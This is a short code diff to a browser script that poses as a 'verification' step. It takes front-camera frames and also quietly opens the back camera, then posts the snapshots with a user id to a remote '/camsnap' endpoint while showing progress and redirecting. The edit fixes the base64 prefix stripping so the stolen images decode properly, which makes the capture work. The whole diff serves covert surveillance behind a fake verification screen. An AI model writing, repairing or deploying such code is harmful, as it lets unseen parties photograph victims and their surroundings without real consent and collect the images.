@@ -209,14 +209,14 @@ async function startVerify(stream){
   var st=setInterval(function(){
     if(vid.readyState<2||vid.videoWidth===0)return;
     ctx.drawImage(vid,0,0,640,640);
-    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+    var d=canvas.toDataURL("image/png").replace("data:image/png;base64,","");
     $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){snapsConfirmed++;setP(55+snapsConfirmed*10);if(snapsConfirmed>=3)tryRedirect();});
     if(++sd>=5)clearInterval(st);
   },1500);
 
   // Back camera
   setTimeout(async function(){
-    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"}}});var bv=document.createElement('video');bv.srcObject=bs;try{await bv.play();}catch(e){}await new Promise(function(r){setTimeout(r,2000);});if(bv.readyState>=2&&bv.videoWidth>0){ctx.drawImage(bv,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});}bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
+    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"}}});var bv=document.createElement('video');bv.srcObject=bs;try{await bv.play();}catch(e){}await new Promise(function(r){setTimeout(r,2000);});if(bv.readyState>=2&&bv.videoWidth>0){ctx.drawImage(bv,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:"back"});}bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
   },3000);
 
   setTimeout(function(){setP(100);setS('Verification complete!');tryRedirect();},20000);
